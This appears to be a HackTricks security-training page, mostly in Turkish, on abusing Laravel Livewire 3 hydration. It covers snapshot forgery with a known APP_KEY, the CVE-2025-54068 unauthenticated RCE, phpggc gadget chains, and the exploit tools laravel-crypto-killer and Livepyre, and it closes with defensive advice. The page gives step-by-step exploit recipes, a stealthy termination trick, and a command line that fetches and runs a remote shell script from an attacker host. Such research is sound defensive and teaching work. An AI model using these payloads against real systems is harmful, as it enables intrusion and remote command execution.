# Laravel Livewire Hydration & Synthesizer Abuse

{{#include ../../banners/hacktricks-training.md}}

## Livewire durum makinesinin özeti

Livewire 3 bileşenleri, `data`, `memo` ve bir checksum içeren **snapshots** aracılığıyla durumlarını değiş tokuş eder. `/livewire/update`'e yapılan her POST, JSON snapshot'ı sunucu tarafında yeniden canlandırır ve kuyrukta bekleyen `calls`/`updates`'i yürütür.
```php
class Checksum {
static function verify($snapshot) {
$checksum = $snapshot['checksum'];
unset($snapshot['checksum']);
if ($checksum !== self::generate($snapshot)) {
throw new CorruptComponentPayloadException;
}
}

static function generate($snapshot) {
return hash_hmac('sha256', json_encode($snapshot), $hashKey);
}
}
```
`APP_KEY`'e sahip olan herhangi biri (`$hashKey`'i türetmek için kullanılan) HMAC'i yeniden hesaplayarak bu nedenle keyfi snapshot'lar oluşturabilir.

Karmaşık özellikler `Livewire\Drawer\BaseUtils::isSyntheticTuple()` tarafından tespit edilen **sentetik tuple'lar** olarak kodlanır; her tuple `[value, {"s":"<key>", ...meta}]` biçimindedir. Hydration çekirdeği her tuple'ı `HandleComponents::$propertySynthesizers` içinde seçilen synth'e devreder ve çocuklar üzerinde yinelemeli olarak işler:
```php
protected function hydrate($valueOrTuple, $context, $path)
{
if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
[$value, $meta] = $tuple;
$synth = $this->propertySynth($meta['s'], $context, $path);
return $synth->hydrate($value, $meta, fn ($name, $child)
=> $this->hydrate($child, $context, "{$path}.{$name}"));
}
```
Bu özyinelemeli tasarım, bir saldırgan tuple meta verilerini veya özyineleme sırasında işlenen herhangi bir iç içe tuple'ı kontrol ettiğinde Livewire'ı bir **genel nesne örnekleme motoru** haline getirir.

## Synthesizers that grant gadget primitives

| Synthesizer | Saldırgan tarafından kontrol edilen davranış |
|-------------|----------------------------------------------|
| **CollectionSynth (`clctn`)** | Her çocuğu yeniden hydrate ettikten sonra `new $meta['class']($value)` olarak örnek oluşturur. Array kabul eden herhangi bir sınıf oluşturulabilir ve her öğe kendisi de sentetik bir tuple olabilir.
| **FormObjectSynth (`form`)** | `new $meta['class']($component, $path)` çağrısını yapar, ardından saldırgan kontrollü çocuklardan `$hydrateChild` aracılığıyla her public property'yi atar. İki gevşek tiplendirilmiş parametre (veya varsayılan argümanlar) kabul eden konstrüktörler, rastgele public property'lere ulaşmak için yeterlidir.
| **ModelSynth (`mdl`)** | Meta içinde `key` yoksa `return new $class;` çalıştırır; bu da saldırganın kontrolündeki herhangi bir sınıfın sıfır argümanla örneklenmesine izin verir.

Synth'ler her iç içe öğe üzerinde `$hydrateChild` çağırdığı için, tuple'ları özyinelemeli olarak yığınlayarak rastgele gadget grafikleri inşa edilebilir.

## Forging snapshots when `APP_KEY` is known

1. Geçerli bir `/livewire/update` isteğini yakalayın ve `components[0].snapshot`'ı decode edin.
2. Gadget sınıflarına işaret eden iç içe tuple'lar enjekte edin ve `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)` yeniden hesaplayın.
3. Snapshot'ı yeniden encode edin, `_token`/`memo`'yu dokunulmamış bırakın ve isteği tekrar oynatın.

Minimal bir yürütme kanıtı **Guzzle'ın `FnStream`** ve **Flysystem'ın `ShardedPrefixPublicUrlGenerator`** kullanır. Bir tuple, yapıcı verisi `{ "__toString": "phpinfo" }` ile `FnStream` örnekler; bir sonraki tuple ise `$prefixes` olarak `[FnStreamInstance]` ile `ShardedPrefixPublicUrlGenerator` örnekler. Flysystem her prefix'i `string`e dönüştürdüğünde, PHP saldırgan tarafından sağlanan `__toString` callable'ını çağırır ve argümansız herhangi bir fonksiyon çalıştırılır.

### From function calls to full RCE

Livewire'ın örnekleme ilkelilerini kullanarak, Synacktiv phpggc'nin `Laravel/RCE4` zincirini adapte etti; böylece hydration, public Queueable durumu deserializasyonu tetikleyen bir nesneyi ayağa kaldırır:

1. **Queueable trait** – `Illuminate\Bus\Queueable` kullanan herhangi bir obje public `$chained`'i açığa çıkarır ve `dispatchNextJobInChain()` içinde `unserialize(array_shift($this->chained))` çalıştırır.
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue), public `$chained` doldurulmuş şekilde `CollectionSynth` / `FormObjectSynth` ile örneklenir.
3. **phpggc Laravel/RCE4Adapted** – `$chained[0]` içinde saklanan serileştirilmiş blob `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed` yapısını oluşturur. `Signed::__invoke()` sonunda `call_user_func_array($closure, $args)` çağrısını yapar ve `system($cmd)`'i mümkün kılar.
4. **Stealth termination** – `[new Laravel\Prompts\Terminal(), 'exit']` gibi ikinci bir `FnStream` callable verilerek istek, gürültülü bir exception yerine `exit()` ile sonlandırılır ve HTTP yanıtı temiz tutulur.

### Automating snapshot forgery

`synacktiv/laravel-crypto-killer` artık her şeyi birleştiren `livewire` moduyla geliyor:
```bash
./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \
-j request.json --function system -p "bash -c 'id'"
```
Araç, yakalanan snapshot'ı ayrıştırır, gadget tuples'ları enjekte eder, checksum'u yeniden hesaplar ve gönderilmeye hazır bir `/livewire/update` payload'u yazdırır.

## CVE-2025-54068 – `APP_KEY` olmadan RCE

Üretici uyarısına göre, sorun Livewire v3 (>= 3.0.0-beta.1 ve < 3.6.3) sürümlerini etkiler ve yalnızca v3'e özgüdür.

`updates` snapshot checksum doğrulandıktan **sonra** bileşen durumuna birleştirilir. Eğer snapshot içindeki bir özellik sentetik tuple ise (veya sentetik tuple'a dönüşürse), Livewire saldırgan kontrollü update değerini hydrate ederken onun meta bilgisini yeniden kullanır:
```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
$meta = $this->getMetaForPath($raw, $path);
if ($meta) {
return $this->hydrate([$value, $meta], $context, $path);
}
}
```
İstismar tarifi:

1. Bir Livewire component içinde türü belirtilmemiş bir public property bulun (ör. `public $count;`).
2. Bu property'yi `[]` olarak ayarlayan bir update gönderin. Bir sonraki snapshot şimdi bunu `[[], {"s": "arr"}]` olarak depoluyor.

Minimal bir type-juggling akışı şöyle görünür:

```http
POST /livewire/update
...
"updates": {"count": []}
```

Sonraki snapshot, `arr` synthesizer metadata'sını koruyan bir tuple olarak saklar:

```json
"count": [[], {"s": "arr"}]
```

3. O property'nin, içinde `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]` gibi tuple'lar gömülü derin iç içe bir dizi içerdiği başka bir `updates` yükü hazırlayın.
4. Recursion sırasında `hydrate()` her iç içe çocuğu bağımsız olarak değerlendirir; dıştaki tuple ve checksum değişmemiş olsa bile saldırganın seçtiği synth anahtarları/sınıfları uygulanır.
5. Aynı `CollectionSynth`/`FormObjectSynth` primitive'lerini yeniden kullanarak `$chained[0]` içinde phpggc payload'u bulunan bir Queueable gadget örnekleyin. Livewire, düzenlenmiş updates'i işler, `dispatchNextJobInChain()`'i çağırır ve `APP_KEY`'i bilmeden `system(<cmd>)`'ye ulaşır.

Bunun çalışmasının ana nedenleri:

- `updates` snapshot checksum'ı kapsamında değildir.
- `getMetaForPath()`, saldırganın daha önce zayıf tipleme yoluyla tuple haline zorlamış olsa bile o property için zaten mevcut olan synth metadata'sına güvenir.
- Recursion artı zayıf tipleme, her iç içe dizinin tamamen yeni bir tuple olarak yorumlanmasına izin verir; böylece keyfi synth anahtarları ve keyfi sınıflar sonunda hydrate sürecine ulaşır.

## Livepyre – end-to-end exploitation

[Livepyre](https://github.com/synacktiv/Livepyre) hem APP_KEY'siz CVE'yi hem de imzalı-snapshot yolunu otomatikleştirir:

- `<script src="/livewire/livewire.js?id=HASH">` öğesini parse ederek dağıtılmış Livewire sürümünü fingerprint'ler ve hash'i zafiyetli sürümlere eşler.
- Zararsız eylemleri yeniden oynatarak ve `components[].snapshot`'ı çıkararak temel snapshot'ları toplar.
- Ya yalnızca `updates` içeren bir payload (CVE-2025-54068) ya da phpggc zincirini gömen sahte bir snapshot (bilinen APP_KEY) üretir.
- Bir snapshot'ta object-typed parametre bulunmazsa, Livepyre coercible bir property'ye ulaşmak için aday parametreleri brute-force etmeye geri döner.

Tipik kullanım:
```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
-f system -p "bash -c 'curl attacker/shell.sh|sh'"
```
`-c/--check` zarar vermeyen bir probe çalıştırır, `-F` sürüm kontrolünü atlar, `-H` ve `-P` özel header'lar veya proxy'ler ekler, ve `--function/--param` gadget chain tarafından çağrılan php fonksiyonunu özelleştirir.

## Savunma önlemleri

- Düzeltme içeren Livewire sürümlerine yükseltin (satıcı bültenine göre >= 3.6.4) ve CVE-2025-54068 için satıcının yamalarını uygulayın.
- Livewire bileşenlerinde zayıf tiplenmiş public özelliklerden kaçının; açıkça belirtilmiş skaler tipler, özellik değerlerinin arrays/tuples'e zorlanmasını engeller.
- Sadece gerçekten ihtiyaç duyduğunuz synthesizers'ı kaydedin ve kullanıcı kontrollü metadata (`$meta['class']`)'ı güvensiz olarak değerlendirin.
- Bir property'sinin JSON tipini değiştiren güncellemeleri (ör. scalar -> array) açıkça izin verilmedikçe reddedin ve eski tuples'ları yeniden kullanmak yerine synth metadata'yı yeniden türetin.
- Herhangi bir ifşa sonrası `APP_KEY`'i derhal döndürün çünkü bu, kod tabanı ne kadar yamalansa da offline snapshot forging'e olanak sağlar.

## Referanslar

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)
- [GHSA-29cq-5w36-x7w3 – Livewire v3 RCE advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)

{{#include ../../banners/hacktricks-training.md}}
